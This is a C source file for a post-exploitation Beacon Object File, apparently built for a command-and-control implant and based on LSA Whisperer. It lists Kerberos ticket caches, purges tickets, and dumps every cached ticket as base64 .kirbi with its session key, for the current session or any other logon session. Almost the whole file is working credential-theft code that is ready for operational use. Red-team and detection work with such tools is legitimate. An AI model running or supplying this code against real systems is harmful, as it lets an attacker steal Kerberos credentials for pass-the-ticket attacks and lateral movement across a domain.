/*
 * kerberos_bof.c - Kerberos Authentication Package BOF
 *
 * Core ops-ready capabilities:
 *   - klist:  Ticket cache listing (QueryTicketCacheEx)
 *   - dump:   Dump tickets as base64 .kirbi (RetrieveEncodedTicket)
 *   - purge:  Selective ticket purge (PurgeTicketCacheEx)
 *
 * Based on LSA Whisperer (MIT License) by Evan McBroom / SpecterOps
 */

#include "../common/lsa_common.c"

/* ============================================================
 * klist - Query Ticket Cache
 *
 * Uses KerbQueryTicketCacheExMessage which returns
 * KERB_TICKET_CACHE_INFO_EX entries. Avoids Ex2 for maximum
 * compatibility (Ex2 adds SessionKeyType/BranchId fields that
 * change the entry stride and can crash if mismatched).
 * ============================================================ */
static void DoKlist(LUID targetLuid) {
    HANDLE hLsa = NULL;
    NTSTATUS status, protocolStatus;
    PVOID pResponse = NULL;
    ULONG responseLen = 0;
    BOOL needsTrusted = !IsZeroLUID(&targetLuid);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Kerberos klist (QueryTicketCacheEx)");

    status = LsaInit(&hLsa, needsTrusted);
    if (!NT_SUCCESS(status)) { PrintNTStatus("LsaInit", status); return; }

    ULONG pkgId = 0;
    status = LsaGetPackageId(hLsa, KERBEROS_PACKAGE_NAME, &pkgId);
    if (!NT_SUCCESS(status)) { PrintNTStatus("LookupPackage", status); goto done; }

    KERB_QUERY_TKT_CACHE_REQUEST req;
    MEMSET(&req, 0, sizeof(req));
    req.MessageType = KerbQueryTicketCacheExMessage;
    req.LogonId = targetLuid;

    status = LsaCallPackage(hLsa, pkgId, &req, sizeof(req),
                            &pResponse, &responseLen, &protocolStatus);
    if (!NT_SUCCESS(status)) {
        PrintNTStatus("LsaCallAuthenticationPackage", status);
        goto done;
    }
    if (!NT_SUCCESS(protocolStatus)) {
        PrintNTStatus("KerbQueryTicketCacheEx", protocolStatus);
        goto done;
    }

    if (!pResponse || responseLen < (sizeof(KERB_PROTOCOL_MESSAGE_TYPE) + sizeof(ULONG))) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Invalid response (len=%d)", responseLen);
        goto done;
    }

    KERB_QUERY_TKT_CACHE_RESPONSE* pResp = (KERB_QUERY_TKT_CACHE_RESPONSE*)pResponse;
    ULONG count = pResp->CountOfTickets;
    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] Cached Tickets: %d\n", count);

    /* Bounds check: ensure count doesn't exceed actual buffer */
    {
        ULONG headerSize = sizeof(KERB_PROTOCOL_MESSAGE_TYPE) + sizeof(ULONG);
        ULONG maxTickets = (responseLen > headerSize) ?
            (responseLen - headerSize) / sizeof(KERB_TICKET_CACHE_INFO_EX) : 0;
        if (count > maxTickets) {
            BeaconPrintf(CALLBACK_ERROR,
                "[!] Ticket count (%d) exceeds buffer. Clamping to %d.", count, maxTickets);
            count = maxTickets;
        }
    }

    for (ULONG i = 0; i < count; i++) {
        KERB_TICKET_CACHE_INFO_EX* t = &pResp->Tickets[i];
        BeaconPrintf(CALLBACK_OUTPUT, "  [%d]", i);
        PrintUnicodeString("Server", &t->ServerName);
        PrintUnicodeString("Server Realm", &t->ServerRealm);
        PrintUnicodeString("Client", &t->ClientName);
        PrintUnicodeString("Client Realm", &t->ClientRealm);
        BeaconPrintf(CALLBACK_OUTPUT, "      Encryption : %s (0x%X)",
                     EncTypeToString(t->EncryptionType), t->EncryptionType);
        BeaconPrintf(CALLBACK_OUTPUT, "      Flags      : 0x%08X", t->TicketFlags);
        BeaconPrintf(CALLBACK_OUTPUT, "");
    }

done:
    LsaCleanup(hLsa, pResponse);
}

/* ============================================================
 * dump - Retrieve Encoded Tickets (.kirbi)
 * ============================================================ */
static void DoDump(LUID targetLuid) {
    HANDLE hLsa = NULL;
    NTSTATUS status, protocolStatus;
    PVOID pCacheResponse = NULL, pTicketResponse = NULL;
    ULONG responseLen = 0;
    BOOL needsTrusted = !IsZeroLUID(&targetLuid);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Kerberos dump (RetrieveEncodedTicket)");

    status = LsaInit(&hLsa, needsTrusted);
    if (!NT_SUCCESS(status)) { PrintNTStatus("LsaInit", status); return; }

    ULONG pkgId = 0;
    status = LsaGetPackageId(hLsa, KERBEROS_PACKAGE_NAME, &pkgId);
    if (!NT_SUCCESS(status)) { PrintNTStatus("LookupPackage", status); goto done; }

    KERB_QUERY_TKT_CACHE_REQUEST cacheReq;
    MEMSET(&cacheReq, 0, sizeof(cacheReq));
    cacheReq.MessageType = KerbQueryTicketCacheExMessage;
    cacheReq.LogonId = targetLuid;

    status = LsaCallPackage(hLsa, pkgId, &cacheReq, sizeof(cacheReq),
                            &pCacheResponse, &responseLen, &protocolStatus);
    if (!NT_SUCCESS(status) || !NT_SUCCESS(protocolStatus)) {
        PrintNTStatus("QueryTicketCache", NT_SUCCESS(status) ? protocolStatus : status);
        goto done;
    }

    if (!pCacheResponse) { BeaconPrintf(CALLBACK_ERROR, "[!] Null response"); goto done; }

    KERB_QUERY_TKT_CACHE_RESPONSE* pCache = (KERB_QUERY_TKT_CACHE_RESPONSE*)pCacheResponse;
    ULONG count = pCache->CountOfTickets;
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Found %d tickets to dump\n", count);

    /* Bounds check */
    {
        ULONG hdr = sizeof(KERB_PROTOCOL_MESSAGE_TYPE) + sizeof(ULONG);
        ULONG maxT = (responseLen > hdr) ? (responseLen - hdr) / sizeof(KERB_TICKET_CACHE_INFO_EX) : 0;
        if (count > maxT) count = maxT;
    }

    for (ULONG i = 0; i < count; i++) {
        KERB_TICKET_CACHE_INFO_EX* t = &pCache->Tickets[i];

        if (!t->ServerName.Buffer || t->ServerName.Length == 0) continue;

        ULONG reqSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + t->ServerName.MaximumLength;
        KERB_RETRIEVE_TKT_REQUEST* pReq = (KERB_RETRIEVE_TKT_REQUEST*)HEAP_ALLOC(reqSize);
        if (!pReq) continue;

        MEMSET(pReq, 0, reqSize);
        pReq->MessageType = KerbRetrieveEncodedTicketMessage;
        pReq->LogonId = targetLuid;
        pReq->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
        pReq->EncryptionType = t->EncryptionType;
        pReq->TicketFlags = 0;
        pReq->TargetName.Length = t->ServerName.Length;
        pReq->TargetName.MaximumLength = t->ServerName.MaximumLength;
        pReq->TargetName.Buffer = (PWSTR)((PUCHAR)pReq + sizeof(KERB_RETRIEVE_TKT_REQUEST));
        MEMCPY(pReq->TargetName.Buffer, t->ServerName.Buffer, t->ServerName.Length);
        MEMSET(&pReq->CredentialsHandle, 0, sizeof(SecHandle));

        pTicketResponse = NULL;
        responseLen = 0;
        status = LsaCallPackage(hLsa, pkgId, pReq, reqSize,
                                &pTicketResponse, &responseLen, &protocolStatus);

        if (NT_SUCCESS(status) && NT_SUCCESS(protocolStatus) && pTicketResponse) {
            KERB_RETRIEVE_TKT_RESPONSE* pTkt = (KERB_RETRIEVE_TKT_RESPONSE*)pTicketResponse;

            if (pTkt->Ticket.EncodedTicket && pTkt->Ticket.EncodedTicketSize > 0) {
                BeaconPrintf(CALLBACK_OUTPUT, "  [%d]", i);
                PrintUnicodeString("Server", &t->ServerName);
                BeaconPrintf(CALLBACK_OUTPUT, "      Size: %d bytes",
                             pTkt->Ticket.EncodedTicketSize);

                ULONG b64Len = 0;
                char* b64 = Base64Encode(pTkt->Ticket.EncodedTicket,
                                         pTkt->Ticket.EncodedTicketSize, &b64Len);
                if (b64) {
                    BeaconPrintf(CALLBACK_OUTPUT, "      Base64 .kirbi:");
                    BeaconPrintf(CALLBACK_OUTPUT, "      %s", b64);
                    HEAP_FREE(b64);
                }

                if (pTkt->Ticket.SessionKey.Length > 0 && pTkt->Ticket.SessionKey.Value) {
                    BeaconPrintf(CALLBACK_OUTPUT, "      Session Key Type: %s",
                                 EncTypeToString(pTkt->Ticket.SessionKey.KeyType));
                    HexString("Session Key", pTkt->Ticket.SessionKey.Value,
                              pTkt->Ticket.SessionKey.Length);
                }
                BeaconPrintf(CALLBACK_OUTPUT, "");
            }

            SECUR32$LsaFreeReturnBuffer(pTicketResponse);
            pTicketResponse = NULL;
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "  [%d] Failed to retrieve ticket", i);
        }

        HEAP_FREE(pReq);
    }

done:
    if (pTicketResponse) SECUR32$LsaFreeReturnBuffer(pTicketResponse);
    LsaCleanup(hLsa, pCacheResponse);
}

/* ============================================================
 * purge - Selective Ticket Purge
 * ============================================================ */
static void DoPurge(LUID targetLuid, const char* serverFilter) {
    HANDLE hLsa = NULL;
    NTSTATUS status, protocolStatus;
    PVOID pResponse = NULL;
    ULONG responseLen = 0;
    BOOL needsTrusted = !IsZeroLUID(&targetLuid);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Kerberos purge (PurgeTicketCacheEx)");
    if (serverFilter && serverFilter[0]) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Filter: %s", serverFilter);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Purging ALL tickets");
    }

    status = LsaInit(&hLsa, needsTrusted);
    if (!NT_SUCCESS(status)) { PrintNTStatus("LsaInit", status); return; }

    ULONG pkgId = 0;
    status = LsaGetPackageId(hLsa, KERBEROS_PACKAGE_NAME, &pkgId);
    if (!NT_SUCCESS(status)) { PrintNTStatus("LookupPackage", status); goto done; }

    KERB_PURGE_TKT_CACHE_EX_REQUEST req;
    MEMSET(&req, 0, sizeof(req));
    req.MessageType = KerbPurgeTicketCacheExMessage;
    req.LogonId = targetLuid;
    req.Flags = 0;

    PWSTR wideServer = NULL;
    if (serverFilter && serverFilter[0]) {
        int wideLen = KERNEL32$MultiByteToWideChar(CP_UTF8, 0, serverFilter, -1, NULL, 0);
        wideServer = (PWSTR)HEAP_ALLOC(wideLen * sizeof(WCHAR));
        if (wideServer) {
            KERNEL32$MultiByteToWideChar(CP_UTF8, 0, serverFilter, -1, wideServer, wideLen);
            req.TicketTemplate.ServerName.Buffer = wideServer;
            req.TicketTemplate.ServerName.Length = (USHORT)((wideLen - 1) * sizeof(WCHAR));
            req.TicketTemplate.ServerName.MaximumLength = (USHORT)(wideLen * sizeof(WCHAR));
        }
    }

    status = LsaCallPackage(hLsa, pkgId, &req, sizeof(req),
                            &pResponse, &responseLen, &protocolStatus);

    if (wideServer) HEAP_FREE(wideServer);

    if (NT_SUCCESS(status) && NT_SUCCESS(protocolStatus)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Tickets purged successfully");
    } else {
        PrintNTStatus("PurgeTicketCache", NT_SUCCESS(status) ? protocolStatus : status);
    }

done:
    LsaCleanup(hLsa, pResponse);
}

/* ============================================================
 * BOF Entry Point
 * ============================================================ */
#ifdef BOF
void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    char* command = BeaconDataExtract(&parser, NULL);
    char* arg1    = BeaconDataExtract(&parser, NULL);
    char* arg2    = BeaconDataExtract(&parser, NULL);

    if (!command || !command[0]) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "=== LSA Whisperer BOF - Kerberos Module ===\n"
            "\n"
            "Commands:\n"
            "  klist [LUID]                - List cached Kerberos tickets\n"
            "  dump [LUID]                 - Dump all tickets as base64 .kirbi\n"
            "  purge [LUID] [server_name]  - Purge tickets (selective!)\n"
            "\n"
            "LUID: 0 = current session, 0x1234abcd = specific session\n"
        );
        return;
    }

    LUID targetLuid = { 0, 0 };

    if (STRICMP(command, "klist") == 0) {
        if (arg1) ParseLUID(arg1, &targetLuid);
        DoKlist(targetLuid);
    }
    else if (STRICMP(command, "dump") == 0) {
        if (arg1) ParseLUID(arg1, &targetLuid);
        DoDump(targetLuid);
    }
    else if (STRICMP(command, "purge") == 0) {
        if (arg1) ParseLUID(arg1, &targetLuid);
        DoPurge(targetLuid, arg2);
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "[!] Unknown command: %s", command);
        BeaconPrintf(CALLBACK_ERROR, "    Valid: klist, dump, purge");
    }
}
#endif
